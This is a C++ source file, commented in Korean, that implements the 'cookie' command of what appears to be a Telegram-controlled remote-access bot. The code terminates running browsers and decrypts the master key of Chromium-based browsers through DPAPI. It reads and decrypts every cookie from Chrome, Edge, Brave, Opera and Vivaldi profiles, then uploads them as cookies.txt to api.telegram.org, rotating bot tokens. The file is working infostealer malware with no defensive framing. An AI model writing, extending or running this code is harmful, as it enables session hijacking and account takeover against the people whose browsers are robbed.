// Command_cookie.cpp (최종 진단 및 완성본)

#include "Commands.h"
#include "TelegramApi.h" // SendText와 토큰 관리 함수들을 사용
#include "Config.h"

// --- 기능 구현에 필요한 모든 헤더 ---
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>     // 파일 전송에 필요
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <filesystem>
#include <sstream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include "json.hpp"
#include "sqlite3.h"

// --- 필요한 라이브러리 링크 ---
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

using json = nlohmann::json;
using byte = unsigned char;

namespace { // 익명 네임스페이스

    // 로컬 UTF-8 변환 함수
    static std::string WToUtf8_local(const std::wstring& w) {
        if (w.empty()) return {};
        int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
        if (len <= 0) return {};
        std::string out(len, 0);
        WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
        if (!out.empty() && out.back() == '\0') out.pop_back();
        return out;
    }

    // =================================================================
    // 1. 파일 전송 기능 (토큰 순환 로직 포함)
    // =================================================================
    bool SendDataAsFile(long long chatId, const std::vector<char>& data, const std::wstring& fileName, const std::wstring& caption) {
        if (data.empty()) return false;

        HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
        BOOL bResult = FALSE;

        const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
        std::string boundary_str = boundary;

        // multipart 본문 생성
        std::stringstream body_stream;
        body_stream << "--" << boundary_str << "\r\n";
        body_stream << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
        body_stream << std::to_string(chatId) << "\r\n";
        if (!caption.empty()) {
            body_stream << "--" << boundary_str << "\r\n";
            body_stream << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
            body_stream << WToUtf8_local(caption) << "\r\n";
        }
        body_stream << "--" << boundary_str << "\r\n";
        body_stream << "Content-Disposition: form-data; name=\"document\"; filename=\"" << WToUtf8_local(fileName) << "\"\r\n";
        body_stream << "Content-Type: application/octet-stream\r\n\r\n";

        std::string header = body_stream.str();
        std::string footer = "\r\n--" + boundary_str + "--\r\n";

        std::vector<char> request_body;
        request_body.insert(request_body.end(), header.begin(), header.end());
        request_body.insert(request_body.end(), data.begin(), data.end());
        request_body.insert(request_body.end(), footer.begin(), footer.end());

        // TelegramApi.cpp의 토큰 순환 로직을 그대로 사용
        const size_t max_retries = GetBotTokenCount();
        if (max_retries == 0) return false;

        for (size_t attempt = 0; attempt < max_retries; ++attempt) {
            if (hRequest) WinHttpCloseHandle(hRequest);
            if (hConnect) WinHttpCloseHandle(hConnect);
            if (hSession) WinHttpCloseHandle(hSession);

            hSession = WinHttpOpen(L"Cookie-FileUploader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) continue;

            WinHttpSetTimeouts(hSession, 0, 60000, 60000, 60000);

            hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) continue;

            // GetCurrentBotToken() 함수로 현재 활성 토큰을 가져옴
            std::wstring fullPath = L"/bot" + GetCurrentBotToken() + L"/sendDocument";

            hRequest = WinHttpOpenRequest(hConnect, L"POST", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest) continue;

            std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary_str.begin(), boundary_str.end());

            bResult = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), request_body.data(), (DWORD)request_body.size(), (DWORD)request_body.size(), 0);
            if (!bResult) continue;

            bResult = WinHttpReceiveResponse(hRequest, NULL);
            if (!bResult) continue;

            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize, NULL);

            if (dwStatusCode == 429) { // Too Many Requests 오류 시
                RotateToNextBotToken(); // 다음 토큰으로 교체
                if (attempt < max_retries - 1) continue;
            }

            bResult = (dwStatusCode == 200); // 200 OK일 때만 성공으로 간주하고 루프 탈출
            break;
        }

        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        return bResult;
    }

    // =================================================================
    // 2. 쿠키 탈취 기능 (최종 진단 로그 포함)
    // =================================================================
    namespace BrowserData {

        std::vector<byte> Base64Decode(const std::string& base64_str) {
            std::vector<byte> result;
            DWORD len = 0;
            if (CryptStringToBinaryA(base64_str.c_str(), 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
                result.resize(len);
                if (!CryptStringToBinaryA(base64_str.c_str(), 0, CRYPT_STRING_BASE64, result.data(), &len, NULL, NULL)) result.clear();
            }
            return result;
        }

        bool DecryptDPAPI(const std::vector<byte>& data, std::vector<byte>& decrypted) {
            DATA_BLOB input;
            input.pbData = const_cast<byte*>(data.data());
            input.cbData = static_cast<DWORD>(data.size());
            DATA_BLOB output;
            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                decrypted.assign(output.pbData, output.pbData + output.cbData);
                LocalFree(output.pbData);
                return true;
            }
            return false;
        }

        std::string DecryptAES_GCM(const std::vector<byte>& key, const std::vector<byte>& data) {
            if (data.size() < 18 || (data[0] != 'v' || data[1] != '1' || (data[2] != '0' && data[2] != '1'))) return "";
            std::vector<byte> nonce(data.begin() + 3, data.begin() + 15);
            std::vector<byte> ciphertext(data.begin() + 15, data.end());
            if (ciphertext.size() <= 16) return "";

            BCRYPT_ALG_HANDLE hAlg = NULL;
            BCRYPT_KEY_HANDLE hKey = NULL;
            std::string decrypted_text;

            do {
                if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) break;
                if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) break;
                if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0))) break;

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
                RtlZeroMemory(&auth_info, sizeof(auth_info));
                auth_info.cbSize = sizeof(auth_info);
                auth_info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
                auth_info.pbNonce = nonce.data();
                auth_info.cbNonce = (ULONG)nonce.size();
                auth_info.pbTag = ciphertext.data() + (ciphertext.size() - 16);
                auth_info.cbTag = 16;

                ULONG decrypted_len = 0;
                std::vector<byte> buffer(ciphertext.size());
                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, buffer.data(), (ULONG)buffer.size(), &decrypted_len, 0);

                // BCryptDecrypt 함수의 결과를 무조건 첫 한 번만 로깅합니다.
                static bool decrypt_info_sent = false;
                if (!decrypt_info_sent) {
                    std::stringstream ss;
                    ss << "🔬 BCryptDecrypt First Result -> NTSTATUS: 0x" << std::hex << status
                        << ", Decrypted Length: " << std::dec << decrypted_len;
                    SendText(CHAT_ID, ss.str());
                    decrypt_info_sent = true;
                }

                if (BCRYPT_SUCCESS(status) && decrypted_len > 0) {
                    decrypted_text.assign(buffer.begin(), buffer.begin() + decrypted_len);
                }

            } while (false);

            if (hKey) BCryptDestroyKey(hKey);
            if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
            return decrypted_text;
        }

        class Extractor {
        public:
            std::string Run() {
                LocatePaths();
                KillBrowserProcesses();
                Sleep(2000);
                for (const auto& [name, path] : m_browser_paths) {
                    if (!std::filesystem::exists(path)) continue;

                    std::vector<byte> key;
                    if (!GetMasterKey(path / "Local State", key)) {
                        continue;
                    }
                    std::vector<std::wstring> profiles = { L"Default", L"Profile 1", L"Profile 2", L"Profile 3", L"Profile 4", L"Profile 5" };
                    for (const auto& profile : profiles) ExtractFrom(name, path, profile, key);
                }
                return m_output_stream.str();
            }
        private:
            std::filesystem::path m_local_appdata, m_roaming_appdata;
            std::map<std::wstring, std::filesystem::path> m_browser_paths;
            std::stringstream m_output_stream;

            bool GetMasterKey(const std::filesystem::path& path, std::vector<byte>& masterKey) {
                if (!std::filesystem::exists(path)) return false;

                std::ifstream f(path, std::ios::binary);
                json state;
                try { f >> state; }
                catch (...) { return false; }

                if (!state.contains("os_crypt") || !state["os_crypt"].contains("encrypted_key")) {
                    return false;
                }

                auto key_b64 = Base64Decode(state["os_crypt"]["encrypted_key"]);
                if (key_b64.size() <= 5) {
                    return false;
                }

                std::vector<byte> key_encrypted(key_b64.begin() + 5, key_b64.end());
                return DecryptDPAPI(key_encrypted, masterKey);
            }

            void LocatePaths() {
                PWSTR p = nullptr;
                if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &p))) { m_local_appdata = p; CoTaskMemFree(p); }
                if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &p))) { m_roaming_appdata = p; CoTaskMemFree(p); }
                m_browser_paths = {
                    {L"Google Chrome", m_local_appdata / L"Google\\Chrome\\User Data"}, {L"Microsoft Edge", m_local_appdata / L"Microsoft\\Edge\\User Data"},
                    {L"Brave", m_local_appdata / L"BraveSoftware\\Brave-Browser\\User Data"}, {L"Opera", m_roaming_appdata / L"Opera Software\\Opera Stable"},
                    {L"Vivaldi", m_local_appdata / L"Vivaldi\\User Data"}
                };
            }

            void KillBrowserProcesses() {
                const std::vector<const wchar_t*> exes = { L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe", L"vivaldi.exe" };
                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snap == INVALID_HANDLE_VALUE) return;
                PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
                if (Process32FirstW(snap, &pe32)) {
                    do {
                        for (const auto& exe : exes) {
                            if (_wcsicmp(pe32.szExeFile, exe) == 0) {
                                HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                                if (proc) { TerminateProcess(proc, 1); CloseHandle(proc); }
                            }
                        }
                    } while (Process32NextW(snap, &pe32));
                }
                CloseHandle(snap);
            }

            void ExtractFrom(const std::wstring& name, const std::filesystem::path& path, const std::wstring& profile, const std::vector<byte>& key) {
                std::filesystem::path db_path = path / profile / "Network" / "Cookies";
                if (name == L"Opera") db_path = path / "Network" / "Cookies";
                if (!std::filesystem::exists(db_path)) return;

                std::filesystem::path temp_db = std::filesystem::temp_directory_path() / L"temp_cookies.db";
                try { std::filesystem::copy_file(db_path, temp_db, std::filesystem::copy_options::overwrite_existing); }
                catch (...) { return; }

                sqlite3* db;
                if (sqlite3_open(temp_db.string().c_str(), &db) != SQLITE_OK) {
                    std::filesystem::remove(temp_db);
                    return;
                }

                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
                    m_output_stream << "\n# Browser: " << WToUtf8_local(name) << " | Profile: " << WToUtf8_local(profile) << "\n";
                    int processed = 0, decrypted = 0;
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        processed++;
                        const byte* blob = (const byte*)sqlite3_column_blob(stmt, 3);
                        int size = sqlite3_column_bytes(stmt, 3);
                        std::string dec = DecryptAES_GCM(key, std::vector<byte>(blob, blob + size));
                        if (!dec.empty()) {
                            decrypted++;
                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
                            const char* cname = (const char*)sqlite3_column_text(stmt, 1);
                            const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
                            long long expires = sqlite3_column_int64(stmt, 4);
                            m_output_stream << host << "\tTRUE\t" << cpath << "\tFALSE\t" << expires << "\t" << cname << "\t" << dec << "\n";
                        }
                    }
                    std::wstring log = L"[" + name + L"/" + profile + L"] Processed: " + std::to_wstring(processed) + L", Succeeded: " + std::to_wstring(decrypted);
                    SendText(CHAT_ID, WToUtf8_local(log));
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);
                std::filesystem::remove(temp_db);
            }
        };
    }

    // =================================================================
    // 3. 텔레그램 명령어 핸들러
    // =================================================================
    static bool CookieHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
        SendText(chatId, "⏳ Cookie extraction and analysis starting (Final Diagnostic)...");

        BrowserData::Extractor extractor;
        std::string cookie_data_str = extractor.Run();

        if (cookie_data_str.empty() || cookie_data_str.find('\n') == std::string::npos) {
            SendText(chatId, "❌ Final Result: No data extracted.");
            return true;
        }

        std::vector<char> data(cookie_data_str.begin(), cookie_data_str.end());

        std::wstring report = L"✅ Extraction complete. File size: " + std::to_wstring(data.size()) + L" bytes";
        SendText(chatId, WToUtf8_local(report));

        if (SendDataAsFile(chatId, data, L"cookies.txt", L"🍪 Cookie list retrieved.")) {
            SendText(chatId, "✅ File sent successfully!");
        }
        else {
            SendText(chatId, "❌ File transfer failed. All tokens might be rate-limited.");
        }
        return true;
    }

    // 명령어 자동 등록
    struct CookieCommandRegistrar {
        CookieCommandRegistrar() {
            RegisterCommand("cookie", CookieHandler);
        }
    };
    static CookieCommandRegistrar g_cookieRegistrar;

} // 익명 네임스페이스 종료